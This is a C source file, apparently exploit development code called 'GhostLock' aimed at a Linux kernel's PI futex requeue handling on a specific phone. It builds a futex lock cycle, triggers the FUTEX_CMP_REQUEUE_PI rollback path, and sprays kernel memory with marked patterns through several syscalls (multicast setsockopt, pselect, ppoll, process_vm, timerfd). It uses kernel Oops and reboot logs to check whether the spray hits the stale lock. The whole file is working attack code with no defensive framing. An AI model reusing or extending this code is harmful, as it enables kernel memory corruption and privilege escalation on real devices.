/* dev_trigger: SAFE GhostLock trigger probe for o1s device (no fire!).
 * owner holds TARGET + blocks on CHAIN; waiter holds CHAIN +
 * WAIT_REQUEUE_PI(f_wait->TARGET, 8s); main gates on wchans + CMP.
 * Reports CMP ret/errno (EDEADLK=35 proves rollback path on KDP kernel)
 * + waiter/owner wchans. No sched_setattr -> no panic risk. */
#define _GNU_SOURCE
#include <errno.h>
#include <linux/futex.h>
#include <linux/sched.h>
#include <netinet/in.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/time.h>

/* dev_mlock: M-walk variant (v10 shape). Same trigger + spray, but the
 * walk enters via MAIN locking cycle_futex (not sched_setattr on waiter).
 * Oracle: ret (bail) vs hang-alarm-15 (spin on mapped lock) vs Oops+reboot.
 * argv[1] = spray lane (same lanes as dev_spray):
 * 0 = PR_SET_NAME, 1 = MCAST native 264B, 2 = pselect nfds=1024,
 * 3 = process_vm, 6 = timerfd/fcntl, 9/12/13/14 = ppoll 32/40/48/64.
 * Pattern word[i] = 0x50000000000000 | lane<<48 | i.
 * Oracle: reboot + lastkmsg VA with 0x5X bytes = COVERED. */
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <unistd.h>
#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_pselect6
#define SYS_pselect6 72
#endif
#ifndef SYS_ppoll
#define SYS_ppoll 73
#endif
#ifndef SYS_timerfd_create
#define SYS_timerfd_create 283
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif
#define FPRV 128

static uint32_t f_wait, f_target, f_chain;
static volatile int a_tid, o_tid, a_ready, b_started, a_waiting;
static volatile int spray_done, m_done;
static int lane = 1, rounds = 30;
static volatile int spray_errno;

static void fill_pat(uint64_t *buf, int n)
{
    for (int i = 0; i < n; i++)
        buf[i] = 0x50000000000000ULL | ((uint64_t)lane << 48) | (uint64_t)i;
}

static void spray(uint64_t *buf)
{
    struct timespec ts0 = {0, 0};
    if (lane == 1) {
        int fd = socket(AF_INET6, SOCK_DGRAM, 0);
        if (fd >= 0) {
            struct group_source_req gsr;
            for (int i = 0; i < rounds; i++) {
                fill_pat(buf, 64);
                memcpy(&gsr, buf, sizeof(gsr));
                errno = 0;
                setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                           &gsr, sizeof(gsr));
                if (!i)
                    spray_errno = errno;
            }
            close(fd);
        } else
            spray_errno = errno;
    } else if (lane == 2) {
        for (int i = 0; i < rounds; i++) {
            fill_pat(buf, 64);
            syscall(SYS_pselect6, 1024, buf, buf + 16, buf + 32, &ts0, 0);
        }
    } else if (lane == 0) {
        char nm[16];
        memset(nm, 0x41 + (lane & 7), 15);
        nm[15] = 0;
        for (int i = 0; i < rounds; i++)
            syscall(SYS_prctl, 15, nm, 0, 0, 0);
    } else if (lane == 3) {
        struct iovec { void *iov_base; size_t iov_len; } iov[8], rio[8];
        for (int i = 0; i < rounds; i++) {
            fill_pat(buf, 64);
            for (int k = 0; k < 8; k++) {
                iov[k].iov_base = (void *)(buf[k] + 0x1000);
                iov[k].iov_len = 8;
                rio[k] = iov[k];
            }
            syscall(270, syscall(20), iov, 8, rio, 8, 0);
            syscall(271, syscall(20), iov, 8, rio, 8, 0);
        }
    } else if (lane == 6) {
        for (int i = 0; i < rounds; i++) {
            int fd = syscall(SYS_timerfd_create, 1, 0);
            if (fd < 0)
                continue;
            int dup = fcntl(fd, F_DUPFD, 32);
            dup2(fd, 31);
            if (dup >= 0)
                close(dup);
            close(31);
            close(fd);
        }
    } else if (lane == 9 || lane == 12 || lane == 13 || lane == 14) {
        int n = 32;
        if (lane == 12)
            n = 40;
        else if (lane == 13)
            n = 48;
        else if (lane == 14)
            n = 64;
        struct {
            int fd;
            short events, revents;
        } pfd[64];
        for (int i = 0; i < rounds; i++) {
            for (int k = 0; k < n; k++) {
                uint64_t w = 0x50000000000000ULL |
                             ((uint64_t)lane << 48) | (uint64_t)k;
                memcpy(&pfd[k], &w, 8);
            }
            syscall(SYS_ppoll, pfd, n, &ts0, 0, 0);
        }
    }
}

static long futex_op(uint32_t *uaddr, int op, uint32_t val, void *arg4,
                     uint32_t *uaddr2, uint32_t val3)
{
    errno = 0;
    return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, val3);
}

static int read_wchan(int tid, char *buf, size_t n)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/task/%d/wchan", tid);
    FILE *f = fopen(path, "r");
    size_t r;
    if (!f)
        return -1;
    r = fread(buf, 1, n - 1, f);
    fclose(f);
    if (!r)
        return -1;
    buf[r] = 0;
    return 0;
}

static int is_futex_blocked(int tid)
{
    char wch[64] = {0};
    return read_wchan(tid, wch, sizeof(wch)) == 0 &&
           strcmp(wch, "futex_wait_queue_me") == 0;
}

static int is_blocked_any(int tid)
{
    char wch[64] = {0};
    if (read_wchan(tid, wch, sizeof(wch)) != 0 || wch[0] == 0)
        return 0;
    return strcmp(wch, "futex_wait_queue_me") == 0 ||
           strcmp(wch, "rt_mutex_wait_proxy_lock") == 0;
}

static void *waiter_fn(void *arg)
{
    struct timespec ts;
    (void)arg;
    a_tid = (int)syscall(SYS_gettid);
    if (futex_op(&f_chain, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0) != 0) {
        printf("waiter: LOCK_PI chain errno=%d\n", errno);
        return NULL;
    }
    a_ready = 1;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 8;
    a_waiting = 1;
    errno = 0;
    long r = syscall(SYS_futex, &f_wait, (FUTEX_WAIT_REQUEUE_PI | FPRV),
                     0, &ts, &f_target, 0);
    printf("waiter: WAIT ret=%ld errno=%d\n", r, errno);
    {
        static uint64_t sbuf[64];
        spray(sbuf);
        printf("waiter: spray lane=%d done spray_errno=%d\n", lane,
               spray_errno);
    }
    spray_done = 1;
    printf("waiter: parking (M walks next)\n");
    while (!m_done)
        sched_yield();
    futex_op(&f_chain, (FUTEX_UNLOCK_PI | FPRV), 0, NULL, NULL, 0);
    return NULL;
}

static void *owner_fn(void *arg)
{
    (void)arg;
    o_tid = (int)syscall(SYS_gettid);
    if (futex_op(&f_target, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0) != 0) {
        printf("owner: LOCK_PI target errno=%d\n", errno);
        return NULL;
    }
    while (!a_ready)
        sched_yield();
    b_started = 1;
    futex_op(&f_chain, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0);
    return NULL;
}

int main(int argc, char **argv)
{
    pthread_t w, o;
    char ow[64] = {0}, ww[64] = {0};
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
    if (argc > 1)
        lane = atoi(argv[1]);
    printf("dev_mlock: M-walk lane=%d\n", lane);
    pthread_create(&o, NULL, owner_fn, NULL);
    pthread_create(&w, NULL, waiter_fn, NULL);
    while (!a_waiting || !b_started)
        sched_yield();
    {
        int ok = 0;
        for (int s = 0; s < 400 && !ok; s++) {
            if (is_futex_blocked(a_tid) && is_blocked_any(o_tid))
                ok = 1;
            else
                usleep(5000);
        }
        read_wchan(o_tid, ow, sizeof(ow));
        read_wchan(a_tid, ww, sizeof(ww));
        printf("main: gate ok=%d owner(%d)=%s waiter(%d)=%s\n", ok, o_tid,
               ow, a_tid, ww);
        if (!ok)
            return 1;
    }
    usleep(50000);
    errno = 0;
    long cr = futex_op(&f_wait, (FUTEX_CMP_REQUEUE_PI | FPRV), 1, (void *)1,
                       &f_target, 0);
    printf("main: CMP ret=%ld errno=%d (35=EDEADLK rollback)\n", cr, errno);
    while (!spray_done)
        sched_yield();
    printf("main: M locking cycle_futex (walk enters via M)\n");
    alarm(15);
    errno = 0;
    long lr = futex_op(&f_chain, (FUTEX_LOCK_PI | FPRV), 0, NULL, NULL, 0);
    alarm(0);
    printf("main: M LOCK_PI cycle ret=%ld errno=%d\n", lr, errno);
    m_done = 1;
    pthread_join(w, NULL);
    pthread_detach(o);
    printf("dev_mlock: done lane=%d\n", lane);
    return 0;
}
